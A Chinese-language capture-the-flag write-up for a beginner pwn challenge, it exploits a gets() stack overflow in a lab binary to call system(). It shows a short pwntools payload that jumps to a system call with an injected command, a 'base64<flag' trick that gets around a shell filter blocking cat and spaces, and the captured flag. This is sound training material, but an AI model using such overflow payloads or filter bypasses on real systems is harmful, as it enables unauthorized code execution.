
## PWN_签到 (344pt)
- 题目描述：
    
    > none
- 题目附件：[pwn0](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/CTFShow-36D/pwn/pwn0/pwn0)
- 考察点：bof、bash
- 难度：简单

### 程序分析

`main`程序就是入门的栈溢出，还给了`system`函数：

```c
int __cdecl main(int argc, const char **argv, const char **envp){
  char v4; // [rsp+0h] [rbp-20h]

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  gets(&v4, 0LL);
  system("echo hello wrold!");
  return 0;
}
```

参数`sh`也给了：

```c
pwndbg> search sh
pwn0            0x601040 0x6873 /* 'sh' */
```

### 解题思路

#### 解法1

直接执行`system("sh")`的时候虽然拿到了shell，但是shell做了过滤，不能用cat和空格，于是用`base64<flag`输出flag:

```c
[*] Switching to interactive mode
[DEBUG] Received 0x79 bytes:
    "/bin/bash: line 1: unexpected EOF while looking for matching ``'\n"
    '/bin/bash: line 2: syntax error: unexpected end of file\n'
/bin/bash: line 1: unexpected EOF while looking for matching ``'
/bin/bash: line 2: syntax error: unexpected end of file
$ base64<flag
[DEBUG] Sent 0xc bytes:
    'base64<flag\n'
[DEBUG] Received 0x3d bytes:
    'ZmxhZ3tkNzVmODU0Ny1kOTZjLTQ2ZTUtYjZlOC05ZmMxYWJmYjc3MDh9Cg==\n'
ZmxhZ3tkNzVmODU0Ny1kOTZjLTQ2ZTUtYjZlOC05ZmMxYWJmYjc3MDh9Cg==
```

#### 解法2

还有一种解法就是不用给的`sh`，直接去执行`base64<flag`

```python
offset = cyclic_find(0x6161616b)
payload = 'base64<flag && '.ljust(offset,'a')
payload += p64(0x400653) # call system
sl(payload)
```

### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/CTFShow-36D/pwn/pwn0)
